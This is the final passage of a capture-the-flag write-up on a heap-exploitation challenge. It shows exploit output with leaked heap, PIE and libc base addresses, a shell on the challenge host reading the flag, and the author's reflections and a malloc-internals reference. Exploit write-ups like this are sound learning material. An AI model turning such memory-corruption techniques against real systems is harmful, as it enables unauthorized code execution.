[b'', b'7ffee915e500', b'58(nil)', b'9', b'9', b'560b2b7c51b0', b'b', b'1', b'560b2d5ae605', b'a61', b'a92f19ee774b4000', b'7ffee9160bf0', b'560b2b7c58b7', b'7ffee9160ce0', b'3(nil)', b'7f062845d0b3', b'7f06286576201. Allocate']
Heap base: 0x560b2d5ac000
Pie leak: 0x560b2b7c4000
Libc base: 0x7f0628436000
[*] Switching to interactive mode
$ ls
flag
ld.so
libc.so.6
memory-heist
ynetd
$ cat flag
IJCTF{so_you_do_know_things_about_memory_heist}
$  
</code></pre></div></div>

<p>Looks like it works to me.</p>

<h1 id="closing-thoughts">Closing thoughts</h1>

<p>No matter how good you think you are, there will always be someone better than you and in my case it was my team-mate. However by no means was my failure to solve this challenge a bad thing.</p>

<p>Strictly speaking, failure (especially when learning) is never really bad, as long as you can come back, learn what you did wrong and try again, until you get it. This morning I had no idea how any of this exploit worked, however now I come out of this with a keener eye, and a wider horizon than before.</p>

<p>That aside, there is a commented version of the exploit in the folder, and I really need to learn more heap exploitation, because you can never learn enough :).</p>

<h2 id="references">References</h2>
<p>I don‚Äôt usually do this, but here:</p>

<p>https://sourceware.org/glibc/wiki/MallocInternals</p>

<p>Only one ref? Yup, but its pretty damn good.</p>
:ET